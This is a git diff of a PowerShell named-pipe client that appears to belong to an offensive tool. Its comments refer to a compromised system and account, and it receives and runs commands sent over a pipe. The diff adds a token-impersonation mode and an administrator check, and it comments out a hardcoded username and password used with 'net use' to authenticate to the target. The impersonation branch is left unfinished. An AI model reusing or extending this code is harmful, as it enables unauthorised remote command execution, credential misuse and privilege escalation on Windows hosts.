@@ -21,23 +21,45 @@ function ReadCommand ([System.IO.StreamReader]$StreamReader){ #Read Command from
         return $status
     }
     elseif($msg -eq "action=5"){
+	Write-Host "------------ Impersonation ------------"
+	$status = "5"
+	return $status
+    }
+    elseif($msg -eq "action=6"){
         Write-Host "Disconnected."
-        $status = "5"
+        $status = "6"
         return $status
     }
 }
 
 $pipeName = "YahudPipe"
 # Compromised system
-$pipeServer = ""
+$pipeServer = "127.0.0.1"
 # Compromised account
-$username = ""
-$password = ""
+#$username = "hakkyahud"
+#$password = "root*123"
 # Authenticate to the server before connecting to the Server pipe
-$auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
-Invoke-Expression -Command $auth
+#$auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
+#Invoke-Expression -Command $auth
 
-$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($pipeServer, $pipeName)
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
+$isAdmin = $principal.IsInRole(
+    [System.Security.Principal.WindowsBuiltInRole]::Administrator
+)
+
+if ($isAdmin) {
+    Write-Host "[+] Running as Administrator"
+}
+
+$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(
+    $pipeServer,
+    $pipeName,
+    [System.IO.Pipes.PipeDirection]::InOut,
+    [System.IO.Pipes.PipeOptions]::None,
+    [System.Security.Principal.TokenImpersonationLevel]::Impersonation
+)
+
 Write-Host "Attempting to connect to the pipe..."
 
 try {
@@ -51,7 +73,7 @@ try {
     $status = "0"
 }
 catch {
-    Write-Host "Failed to connect to the pipe."
+    Write-Host "Failed to connect to the pipe: $_"
     $pipeClient.Dispose()
 }
 
@@ -62,7 +84,7 @@ while($pipeClient.IsConnected){
 
     elseif($status -eq "1"){
         $msg = $sr.ReadLine()
-        if($msg -eq "stop"){
+        if($msg -eq ":quit"){
             Write-Host "Stop receiving message..."
             $status = "0"
         }
@@ -117,7 +139,7 @@ while($pipeClient.IsConnected){
 
     elseif($status -eq "3"){
         $command = $sr.ReadLine()
-        if($command -eq "stop"){
+        if($command -eq ":quit"){
             Write-Host "Stop running command"
             $status = "0"
         }
@@ -169,6 +191,12 @@ while($pipeClient.IsConnected){
     }
 
     elseif($status -eq "5"){
+        $status = "0"
+        $sessionId = $null
+        $hPipe = $pipeClient.SafePipeHandle.DangerousGetHandle()
+    }
+
+    elseif($status -eq "6"){
         $sr.Dispose();
         $pipeClient.Dispose();
     }
